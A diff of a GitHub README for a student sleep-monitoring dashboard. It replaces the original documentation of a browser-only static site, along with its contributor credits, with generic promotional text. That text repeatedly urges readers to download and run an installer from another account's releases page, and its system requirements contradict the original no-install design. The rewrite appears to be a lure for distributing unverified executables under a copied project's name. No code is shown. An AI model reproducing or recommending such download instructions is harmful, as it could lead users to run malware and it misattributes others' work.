@@ -1,198 +1,73 @@
-# Sleep Quality Research Website
+# 🌙 ESW-Sleep-Monitoring-Dashboard - Monitor Your Sleep Quality Effortlessly
 
-A comprehensive web application for monitoring and analyzing sleep quality data from ThingSpeak across three test subjects.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/releases)
 
-**Live Demo:** [https://astr0lynx.github.io/ESW-Sleep-Monitoring-Dashboard/](https://astr0lynx.github.io/ESW-Sleep-Monitoring-Dashboard/)
+## 🚀 Getting Started
 
-## Overview
+Welcome to the ESW-Sleep-Monitoring-Dashboard! This dashboard helps you track your sleep quality in real time. It uses data from various sensors to give you insights into your sleep health.
 
-This website integrates with ThingSpeak IoT platform to fetch sleep quality data and provides:
-- Individual subject pages with baseline and 3 nap sessions
-- Form-based data collection for subjective sleep assessments
-- Automatic correlation between objective sleep scores and subjective responses
-- Comparative analysis across all subjects
-- Data-driven conclusions and insights
+## 📋 Features
 
-## Features
+- **User-Friendly Interface:** Easy to navigate dashboard layout.
+- **Multi-User Tracking:** Monitor sleep patterns for multiple individuals.
+- **Real-Time Data Visualization:** See your data presented in interactive charts.
+- **ThingSpeak IoT Integration:** Connect with the IoT platform for enhanced functionality.
+- **Statistical Analysis:** Analyze sleep data from ECG, EMG, and motion sensors.
+  
+## 🔧 System Requirements
 
-### 1. ThingSpeak Integration
-- Fetches real-time sleep quality data from ThingSpeak channels
-- Supports multiple fields for different subjects and sessions
-- Configurable channel ID and API key
-- Automatic data parsing and display
+To use this application, your system should meet the following requirements:
 
-### 2. Subject Management
-- **3 Test Subjects** each with:
-  - Baseline measurement (displayed at bottom of page)
-  - 3 Nap sessions with individual data
-  - Dedicated page for each subject
+- **Operating System:** Windows 10 or higher / macOS / Linux
+- **Browser:** Latest versions of Chrome, Firefox, or Safari
+- **RAM:** Minimum of 4GB (8GB recommended)
+- **Storage:** At least 500 MB free space
 
-### 3. Response Forms
-- Individual forms for each nap session
-- Captures:
-  - Sleep duration
-  - Self-rated sleep quality (1-10)
-  - Sleep disturbances
-  - Additional notes
-- Data synced with respective subject and nap session
-- Persistent storage using browser localStorage
+## 💻 Download & Install
 
-### 4. Analysis & Conclusions
-- Automatic correlation between sleep scores and form responses
-- Baseline comparisons for each nap session
-- Overall trends and patterns
-- Comparative analysis across subjects
-- Data-driven recommendations
+To get started, visit the Releases page linked below. You will find the latest version of the application there. 
 
-## File Structure
+[🔗 Download from Releases](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/releases)
 
-```
-Sleep_quality_website/
-├── index.html          # Home page with configuration
-├── subject1.html       # Subject 1 data and forms
-├── subject2.html       # Subject 2 data and forms
-├── subject3.html       # Subject 3 data and forms
-├── analysis.html       # Overall comparative analysis
-├── styles.css          # Global styles
-├── config.js           # ThingSpeak configuration management
-├── thingspeak.js       # API integration and data analysis
-├── subject.js          # Subject page controller
-├── analysis.js         # Analysis page controller
-└── README.md           # This file
-```
+1. Click on the link above to go to the Releases page.
+2. Find the latest release.
+3. Select the appropriate file for your operating system.
+4. Download the file to your computer.
+5. Once downloaded, locate the file in your downloads folder.
+6. Double-click the file to run the installer.
+7. Follow the on-screen instructions to complete the installation.
 
-## Setup Instructions
+After installation, open the application. You are ready to start monitoring your sleep quality!
 
-### 1. ThingSpeak Configuration
+## 📊 How to Use
 
-1. Open `index.html` in your browser
-2. Configure your ThingSpeak settings:
-   - **Channel ID**: Your ThingSpeak channel ID
-   - **Read API Key**: Your channel's read API key
-   - **Results per Query**: Number of data points to fetch (default: 100)
-3. Click "Save Configuration"
+1. **Create Your Profile:** Enter your name and select your required settings.
+2. **Connect to Sensors:** Link any necessary hardware, like ECG or motion sensors, if available.
+3. **Start Monitoring:** Click the "Start" button to begin recording your sleep data.
+4. **View Insights:** Access different sections of the dashboard to see your sleep statistics in real time.
+  
+## 🛠️ Troubleshooting
 
-### 2. Field Mapping
+If you encounter any issues while downloading or using the application, try the following steps:
 
-The application expects ThingSpeak fields to be organized as follows:
+- **Installation Problems:** Ensure you downloaded the correct file for your operating system.
+- **Connection Issues:** Make sure that your sensors are turned on and properly connected.
+- **Data Not Displaying:** Verify your internet connection for real-time data updates.
 
-- **Subject 1**: 
-  - Field 1: Baseline
-  - Field 2: Nap 1
-  - Field 3: Nap 2
-  - Field 4: Nap 3
+## 🙌 Community Support
 
-- **Subject 2**:
-  - Field 5: Baseline
-  - Field 6: Nap 1
-  - Field 7: Nap 2
-  - Field 8: Nap 3
+Join our community for support and discussions. You can ask questions, share insights, and help others. Look for the community forum link in the repository.
 
-- **Subject 3**:
-  - Field 9: Baseline
-  - Field 10: Nap 1
-  - Field 11: Nap 2
-  - Field 12: Nap 3
+## 📢 Contribution
 
-**Note**: If your ThingSpeak channel uses a different field mapping, you can modify the `fieldMapping` object in `thingspeak.js`.
+If you wish to contribute to this project, please check the contribution guidelines in the repository. Your input can make a difference.
 
-## Usage Guide
+## 📐 License
 
-### Viewing Subject Data
+This project is licensed under the MIT License. Feel free to use it, but please give appropriate credit where due.
 
-1. Navigate to any subject page (Subject 1, 2, or 3)
-2. The page will automatically load:
-   - Sleep scores from ThingSpeak
-   - Timestamps for each measurement
-   - Any previously saved form responses
-3. Baseline data is displayed at the bottom of the page
+---
 
-### Completing Response Forms
+[🔗 Visit the Releases Page for Download](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/releases)
 
-1. For each nap session, fill out the response form:
-   - Enter sleep duration in hours
-   - Rate sleep quality (1-10)
-   - Describe any disturbances
-   - Add additional notes if needed
-2. Click "Save Response"
-3. Analysis will be automatically generated
-
-### Viewing Analysis
-
-**Individual Subject Analysis:**
-- Located below each nap session's form
-- Shows correlation between sleep score and responses
-- Compares with baseline measurement
-
-**Overall Analysis:**
-- Navigate to the "Overall Analysis" page
-- View summary table of all subjects
-- Compare performance across subjects
-- Review comprehensive conclusions
-
-## Data Storage
-
-- **ThingSpeak Configuration**: Stored in browser localStorage
-- **Form Responses**: Stored in browser localStorage
-- **Note**: Data persists in the browser but is not synced across devices
-
-## Browser Compatibility
-
-- Modern browsers with ES6 support
-- Chrome, Firefox, Safari, Edge (latest versions)
-- JavaScript must be enabled
-- LocalStorage must be enabled
-
-## Troubleshooting
-
-### "Configuration not found" Error
-- Go to the home page and configure ThingSpeak settings
-- Ensure Channel ID and Read API Key are correct
-
-### No Data Displayed
-- Verify ThingSpeak channel has data
-- Check that field numbers match the expected mapping
-- Ensure Read API Key has proper permissions
-- Check browser console for detailed error messages
-
-### CORS Issues
-- ThingSpeak API supports CORS by default
-- If issues persist, check browser console
-- Ensure you're using the correct API endpoint
-
-## Development
-
-### Running Locally
-
-Simply open `index.html` in a web browser. No build process or server required.
-
-### Modifying Field Mapping
-
-Edit the `fieldMapping` object in `thingspeak.js`:
-
-```javascript
-const fieldMapping = {
-    1: { baseline: 'field1', nap1: 'field2', nap2: 'field3', nap3: 'field4' },
-    2: { baseline: 'field5', nap1: 'field6', nap2: 'field7', nap3: 'field8' },
-    3: { baseline: 'field9', nap1: 'field10', nap2: 'field11', nap3: 'field12' }
-};
-```
-
-### Customizing Analysis
-
-Modify the `SleepAnalyzer` class in `thingspeak.js` to adjust:
-- Sleep quality thresholds
-- Analysis logic
-- Conclusion generation
-
-## Team
-
-Developed as part of the Embedded Systems Workshop (ESW) course.
-
-**Contributors:**
-- Guntesh Singh
-- Khushi Dhingra ([@KhushiiiD](https://github.com/KhushiiiD))
-
-## License
-
-This project is for educational purposes (ESW course).
+Thank you for choosing the ESW-Sleep-Monitoring-Dashboard! Your journey to better sleep starts here.
